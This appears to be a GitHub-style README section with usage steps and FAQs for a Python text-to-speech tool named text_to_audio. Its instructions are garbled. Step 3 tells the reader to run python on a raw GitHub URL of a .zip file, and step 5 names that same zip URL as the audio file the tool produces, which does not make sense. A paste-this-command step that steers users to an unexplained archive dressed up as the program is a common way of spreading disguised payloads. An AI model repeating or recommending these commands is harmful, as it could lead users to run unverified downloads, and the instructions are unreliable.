## üé§ How to Use text_to_audio

Follow these simple steps to convert text to speech:

1. Open a terminal or command prompt.
   
   - On Windows, you can search for "Command Prompt."
   - On macOS, use "Terminal" found in Applications.

2. Navigate to the folder where you extracted `text_to_audio`. Use the `cd` command followed by the folder path:

   ```bash
   cd path_to_your_folder/text_to_audio
   ```

3. Run the program by typing:

   ```bash
   python https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip
   ```

4. When prompted, enter the text you wish to convert to speech.

5. The application will generate an audio file named `https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip`. This file will be played automatically for you to listen.

## ‚ùì FAQs

### How do I know if Python is installed?

Open your terminal or command prompt and type:

```bash
python --version
```

If Python is installed, it will display the version number.

### What if I encounter an error when running the script?

Make sure you have all the required libraries installed. You can install `gTTS` by typing the following command:

```bash
pip install gTTS
```

### Can I use this on my phone or tablet?

This application is designed for computers. However, you can run it in a web environment like Google Colab, which is accessible on mobile devices.
